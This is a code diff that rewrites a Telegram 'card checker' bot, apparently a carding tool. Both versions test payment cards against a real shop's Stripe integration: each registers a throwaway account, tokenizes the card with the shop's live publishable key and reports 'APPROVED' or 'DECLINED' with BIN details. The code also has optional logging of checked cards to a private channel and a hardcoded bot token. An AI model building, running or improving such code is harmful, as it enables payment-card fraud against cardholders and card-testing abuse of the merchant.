@@ -1,247 +1,252 @@
-import aiohttp
+import re
+import requests
+import random
 import asyncio
 from datetime import datetime
-from aiogram import Bot, Dispatcher, types
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
 
-# ==== CONFIG ====
-TOKEN = "8003502803:AAHz0pg5zbhjZaeNsdR3FudgT2Yx1PMuF0s"
-DOMAIN = "https://infiniteautowerks.com/"
-PK = "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae"
-CHECKER_NAME = "Bᴜɴɴʏ"
+bot_token = '8003502803:AAHz0pg5zbhjZaeNsdR3FudgT2Yx1PMuF0s'  # <-- Replace this!
+private_channel_id = -1002621183707  # Logging (optional), remove if you don't want logs
 
-bot = Bot(token=TOKEN)
-dp = Dispatcher(bot)
+kk = "qwertyuiolmkjnhbgvfcdxszaQWEAERSTSGGZJDNFMXLXLVKPHPY1910273635519"
 
-# ==== CLASSIC UI ====
-def format_result(card, status, response, gate, bin_, country, issuer, typ, time, by):
-    return (
-        f"[ϟ] 𝗖𝗖 - <code>{card}</code>\n"
-        f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status}\n"
-        f"[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {response}\n"
-        f"[ϟ] 𝗚𝗮𝘁𝗲 - {gate}\n"
-        "━━━━━━━━━━━━━\n"
-        f"[ϟ] 𝗕𝗶𝗻 : {bin_}\n"
-        f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country}\n"
-        f"[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : {issuer}\n"
-        f"[ϟ] 𝗧𝘆𝗽𝗲 : {typ}\n"
-        "━━━━━━━━━━━━━\n"
-        f"[ϟ] 𝗧𝗶𝗺𝗲 : {time}\n"
-        f"[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : <b>{by}</b>"
-    )
+def extract_cc(text):
+    return re.findall(r"\b\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}\b", text)
 
-# ==== BIN LOOKUP ====
-async def get_bin_info(bin_):
+def get_bin_info(bin_number):
     try:
-        url = f"https://bins.antipublic.cc/bins/{bin_}"
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, timeout=10) as resp:
-                if resp.status == 200:
-                    text = await resp.text()
-                    line = text.strip().split('\n')[0]
-                    parts = [p.strip() for p in line.split(",")]
-                    if len(parts) >= 6:
-                        scheme = parts[1]
-                        typ = parts[2]
-                        country = parts[4]
-                        issuer = parts[3]
-                        card_type = f"{typ.upper()} - {scheme.upper()}"
-                        return country, issuer, card_type
+        url = f"https://lookup.binlist.net/{bin_number}"
+        headers = {"Accept-Version": "3"}
+        resp = requests.get(url, headers=headers, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            country = data.get("country", {}).get("name", "UNKNOWN")
+            emoji = data.get("country", {}).get("emoji", "")
+            issuer = data.get("bank", {}).get("name", "UNKNOWN")
+            scheme = data.get("scheme", "").upper()
+            type_ = data.get("type", "UNKNOWN").upper()
+            card_type = f"{type_} - {scheme}" if type_ != "UNKNOWN" else scheme
+            return {
+                "country": f"{country} {emoji}".strip(),
+                "issuer": issuer,
+                "type": card_type
+            }
     except Exception as e:
         print("BIN lookup error:", e)
-    return "UNKNOWN", "UNKNOWN", "UNKNOWN"
+    return {
+        "country": "UNKNOWN",
+        "issuer": "UNKNOWN",
+        "type": "UNKNOWN"
+    }
 
-def parseX(data, start, end):
-    try:
-        star = data.index(start) + len(start)
-        last = data.index(end, star)
-        return data[star:last]
-    except ValueError:
-        return "None"
+def format_cc_result(ccx, status, site_response, bin_info, country, issuer, card_type, user_first_name):
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    return (
+        f"[ϟ] 𝗖𝗖 - <code>{ccx}</code>\n"
+        f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status}\n"
+        f"[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {site_response}\n"
+        f"[ϟ] 𝗚𝗮𝘁𝗲 - Stripe Auth\n"
+        f"━━━━━━━━━━━━━\n"
+        f"[ϟ] 𝗕𝗶𝗻 : <code>{bin_info}</code>\n"
+        f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country}\n"
+        f"[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : {issuer}\n"
+        f"[ϟ] 𝗧𝘆𝗽𝗲 : {card_type}\n"
+        f"━━━━━━━━━━━━━\n"
+        f"[ϟ] 𝗧𝗶𝗺𝗲 : {now}\n"
+        f"[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : <b>{user_first_name}</b>"
+    )
 
-# ==== SITE RESPONSE PARSER ====
-def parse_site_response(site_text):
-    lower = site_text.lower()
-    if "succeeded" in lower or "setup_intent" in lower or "approved" in lower or "payment method added" in lower or "success" in lower:
-        return "APPROVED", "Payment method successfully added ✅"
-    elif "insufficient funds" in lower:
-        return "APPROVED", "Payment method successfully added ✅ (Insufficient funds)"
-    elif "3d secure" in lower or "authentication required" in lower or "three_d_secure" in lower:
-        return "DECLINED", "3D Secure authentication required 🔒"
-    elif "incorrect_cvc" in lower or "cvc was incorrect" in lower or "security code is incorrect" in lower:
-        return "DECLINED", "Incorrect CVC"
-    elif "card was declined" in lower or "card_declined" in lower or ("declined" in lower and "insufficient" not in lower):
-        return "DECLINED", "Card was declined"
-    elif "expired_card" in lower:
-        return "DECLINED", "Expired card"
-    elif "pickup_card" in lower:
-        return "DECLINED", "Pick up card (stolen/lost)"
-    elif "processing_error" in lower:
-        return "DECLINED", "Processing error"
-    elif "do_not_honor" in lower:
-        return "DECLINED", "Do not honor"
-    elif "incorrect_number" in lower or "invalid number" in lower:
-        return "DECLINED", "Incorrect card number"
-    elif "balance not sufficient" in lower or "insufficient balance" in lower:
-        return "DECLINED", "Insufficient balance"
-    elif "invalid_account" in lower:
-        return "DECLINED", "Invalid account"
-    else:
-        preview = site_text.strip()[:100].replace('\n', ' ')
-        return "DECLINED", preview if preview else "Unknown site response"
-
-async def make_request(session, url, method="POST", params=None, headers=None, data=None, json=None):
-    async with session.request(
-        method,
-        url,
-        params=params,
-        headers=headers,
-        data=data,
-        json=json,
-    ) as response:
-        return await response.text()
-
-# ==== LIVE CHECKER ====
-async def ppc(cards):
-    cc, mon, year, cvv = cards.split("|")
-    year = year[-2:]
-
-    async with aiohttp.ClientSession() as my_session:
+def chk(ccx):
+    def get_fresh_session():
+        s = requests.session()
+        r = (
+            random.choice(kk)*2 +
+            random.choice(kk)*2 +
+            random.choice(kk)*2 +
+            random.choice(kk)*2 +
+            random.choice(kk)*2 +
+            random.choice(kk)*2 +
+            random.choice(kk) +
+            random.choice(kk)
+        )
+        url = "https://infiniteautowerks.com/my-account/"
         headers = {
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "accept-language": "en-US,en;q=0.9",
-            "cache-control": "max-age=0",
-            "priority": "u=0, i",
-            "referer": f"{DOMAIN}/my-account/payment-methods/",
-            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": '"Windows"',
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-site": "same-origin",
-            "sec-fetch-user": "?1",
-            "upgrade-insecure-requests": "1",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "accept-language": "en-US,en;q=0.9,ar;q=0.8",
         }
-        req = await make_request(
-            my_session,
-            url=f"{DOMAIN}/my-account/add-payment-method/",
-            method="GET",
-            headers=headers,
-        )
-        await asyncio.sleep(1)
-        nonce = parseX(req, '"createAndConfirmSetupIntentNonce":"', '"')
+        resp = s.get(url, headers=headers)
+        try:
+            nonce = resp.text.split('name="woocommerce-register-nonce" value=')[1].split('"')[1]
+        except Exception:
+            return None, None, None
 
-        headers2 = {
-            "accept": "application/json",
-            "accept-language": "en-US,en;q=0.9",
-            "content-type": "application/x-www-form-urlencoded",
-            "origin": "https://js.stripe.com",
-            "priority": "u=1, i",
-            "referer": "https://js.stripe.com/",
-            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": '"Windows"',
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-site",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+        payload = {
+            "email": f"{r}123@gmail.com",
+            "woocommerce-register-nonce": nonce,
+            "_wp_http_referer": "/my-account/",
+            "register": "Register",
         }
-        data2 = {
-            "type": "card",
-            "card[number]": f"{cc}",
-            "card[cvc]": f"{cvv}",
-            "card[exp_year]": f"{year}",
-            "card[exp_month]": f"{mon}",
-            "allow_redisplay": "unspecified",
-            "billing_details[address][postal_code]": "99501",
-            "billing_details[address][country]": "US",
-            "pasted_fields": "number",
-            "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
-            "referrer": DOMAIN,
-            "time_on_page": "187650",
-            "client_attribution_metadata[client_session_id]": "8c6ceb69-1a1d-4df7-aece-00f48946fa47",
-            "client_attribution_metadata[merchant_integration_source]": "elements",
-            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
-            "client_attribution_metadata[merchant_integration_version]": "2021",
-            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
-            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
-            "guid": "19ae2e71-398b-4dff-929f-1578fe0c0a1a4731fd",
-            "muid": "2b6bbdfd-253b-4197-b81b-4d9f3035cd009df6c5",
-            "sid": "ad7b0952-8857-4cfd-b07f-3f43034df86cea6048",
-            "key": PK,
-            "_stripe_version": "2024-06-20",
-        }
-        req2 = await make_request(
-            my_session,
-            f"https://api.stripe.com/v1/payment_methods",
-            headers=headers2,
-            data=data2,
-        )
-        await asyncio.sleep(1)
-        pmid = parseX(req2, '"id": "', '"')
+        s.post(url, data=payload, headers=headers, cookies=s.cookies)
+        return s, headers, s.cookies
 
-        headers3 = {
-            "accept": "*/*",
-            "accept-language": "en-US,en;q=0.9",
-            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "origin": DOMAIN,
-            "priority": "u=1, i",
-            "referer": f"{DOMAIN}/my-account/add-payment-method/",
-            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": '"Windows"',
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-origin",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
-            "x-requested-with": "XMLHttpRequest",
-        }
-        data3 = {
-            "action": "create_and_confirm_setup_intent",
-            "wc-stripe-payment-method": pmid,
-            "wc-stripe-payment-type": "card",
-            "_ajax_nonce": nonce,
-        }
-        req4 = await make_request(
-            my_session,
-            url=f"{DOMAIN}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
-            headers=headers3,
-            data=data3,
-        )
-        status, response = parse_site_response(req4)
-        return status, response
+    def get_payment_nonce(session, headers, cookies):
+        url = "https://infiniteautowerks.com/my-account/add-payment-method/"
+        resp = session.get(url, headers=headers, cookies=cookies)
+        try:
+            nonce1 = resp.text.split('createAndConfirmSetupIntentNonce":')[1].split('"')[1]
+        except Exception:
+            return None
+        return nonce1
 
-# ==== BOT COMMANDS ====
+    session, headers, cookies = get_fresh_session()
+    if session is None:
+        return "Session setup failed.", "Could not start site session."
+    nonce1 = get_payment_nonce(session, headers, cookies)
+    if nonce1 is None:
+        session, headers, cookies = get_fresh_session()
+        nonce1 = get_payment_nonce(session, headers, cookies)
+        if nonce1 is None:
+            return "Payment nonce setup failed.", "Site error, cannot get payment nonce."
 
-@dp.message_handler(commands=["start", "help"])
-async def start_help(message: types.Message):
-    await message.reply(
-        "<b>Card Checker Bot</b>\n\n"
-        "Commands:\n"
-        "• /chk <code>CC|MM|YY|CVV</code> — Single check\n",
+    try:
+        cc = ccx.split("|")[0]
+        exp = ccx.split("|")[1]
+        exy = ccx.split("|")[2]
+        if len(exy) == 4:
+            exy = exy[2:]
+        ccv = ccx.split("|")[3]
+    except:
+        return "Error: Card format.", "Error: Invalid card format."
+
+    url = "https://api.stripe.com/v1/payment_methods"
+    payload = {
+        "type": "card",
+        "card[number]": cc,
+        "card[cvc]": ccv,
+        "card[exp_year]": exy,
+        "card[exp_month]": exp,
+        "allow_redisplay": "unspecified",
+        "billing_details[address][country]": "EG",
+        "payment_user_agent": "stripe.js/d16ff171ee; stripe-js-v3/d16ff171ee; payment-element; deferred-intent",
+        "referrer": "https://infiniteautowerks.com",
+        "time_on_page": "19537",
+        "client_attribution_metadata[client_session_id]": "8a3d508b-f6ba-4f16-be66-c59232f6afc0",
+        "key": "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae",
+        "_stripe_version": "2024-06-20",
+    }
+    stripe_headers = {
+        "User-Agent": headers["User-Agent"],
+        "Accept": "application/json",
+        "origin": "https://js.stripe.com",
+        "referer": "https://js.stripe.com/",
+        "accept-language": "en-US,en;q=0.9,ar;q=0.8",
+    }
+
+    response = requests.post(url, data=payload, headers=stripe_headers)
+    try:
+        tok = response.json()["id"]
+    except Exception as e:
+        error_msg = response.json().get("error", {}).get("message", str(e))
+        return "DECLINED ❌", error_msg
+
+    url = "https://infiniteautowerks.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
+    payload = {
+        "action": "create_and_confirm_setup_intent",
+        "wc-stripe-payment-method": tok,
+        "wc-stripe-payment-type": "card",
+        "_ajax_nonce": nonce1,
+    }
+    confirm_headers = {
+        "User-Agent": headers["User-Agent"],
+        "x-requested-with": "XMLHttpRequest",
+        "origin": "https://infiniteautowerks.com",
+        "referer": "https://infiniteautowerks.com/my-account/add-payment-method/",
+        "accept-language": "en-US,en;q=0.9,ar;q=0.8",
+    }
+    resp = session.post(url, data=payload, headers=confirm_headers, cookies=cookies)
+    txt = resp.text
+
+    # Analyze response and message
+    if "succeeded" in txt:
+        return "APPROVED ✅", "Payment method successfully added ✅"
+    elif "insufficient funds" in txt:
+        return "APPROVED ✅", "Payment method successfully added ✅ (insufficient funds)"
+    elif "incorrect_cvc" in txt or "security code is incorrect" in txt:
+        return "DECLINED ❌", "Incorrect CVC"
+    elif "card was declined" in txt:
+        return "DECLINED ❌", "Card was declined"
+    else:
+        return "DECLINED ❌", (txt.strip()[:120] if txt else "Unknown site response.")
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [
+        [InlineKeyboardButton("More Gateway 🚧", callback_data="more_gateway")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    text = (
+        "<b>🚀 Coming Soon!\n\n"
+        "This bot will soon support more gateways and features.\n"
+        "Stay tuned! 👀</b>"
+    )
+    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="HTML")
+
+async def more_gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text(
+        text="🚧 More Gateway coming soon!\nFollow updates for new features.",
         parse_mode="HTML"
     )
 
-@dp.message_handler(commands=["chk"])
-async def chk_handler(message: types.Message):
-    args = message.get_args().strip()
+async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    args = context.args
     if not args:
-        await message.reply("Usage: `/chk 4242424242424242|12|25|123`", parse_mode="Markdown")
+        await update.message.reply_text(
+            "Usage: <code>/chk xxxxxxxxxxxxxxxx|mm|yyyy|cvv</code>",
+            parse_mode="HTML"
+        )
         return
-    card = args
-    checking_msg = await message.reply(f"🔄 Checking: <code>{card}</code>", parse_mode="HTML")
-    try:
-        status_raw, response = await ppc(card)
-        status = "APPROVED ✅" if "APPROVED" in status_raw else "DECLINED ❌"
-        bin_ = card[:6]
-        country, issuer, typ = await get_bin_info(bin_)
-        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        user_name = message.from_user.first_name if message.from_user else CHECKER_NAME
-        text = format_result(card, status, response, "Stripe Auth", bin_, country, issuer, typ, now, user_name)
-        await checking_msg.edit_text(text, parse_mode="HTML")
-    except Exception as e:
-        await checking_msg.edit_text(f"Error: <code>{e}</code>", parse_mode="HTML")
+    text = " ".join(args)
+    cc_list = extract_cc(text)
+    if not cc_list:
+        await update.message.reply_text("❗ No valid CC found in your input.")
+        return
+
+    user_first_name = update.effective_user.first_name
+
+    for ccx in cc_list:
+        bin_info = ccx.split('|')[0][:6]
+        bin_data = await asyncio.to_thread(get_bin_info, bin_info)
+        status, site_response = await asyncio.to_thread(chk, ccx)
+
+        formatted_msg = format_cc_result(
+            ccx=ccx,
+            status=status,
+            site_response=site_response,
+            bin_info=bin_info,
+            country=bin_data["country"],
+            issuer=bin_data["issuer"],
+            card_type=bin_data["type"],
+            user_first_name=user_first_name
+        )
+
+        await update.message.reply_text(formatted_msg, parse_mode="HTML")
+        # Uncomment below to log in your channel
+        # await context.bot.send_message(
+        #     chat_id=private_channel_id,
+        #     text=formatted_msg,
+        #     parse_mode="HTML"
+        # )
+        await asyncio.sleep(15)
+
+def main():
+    app = Application.builder().token(bot_token).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("chk", chk_command))
+    app.add_handler(CallbackQueryHandler(more_gateway_callback, pattern="^more_gateway$"))
+    app.run_polling()
 
 if __name__ == "__main__":
-    from aiogram import executor
-    executor.start_polling(dp, skip_updates=True)
+    main()
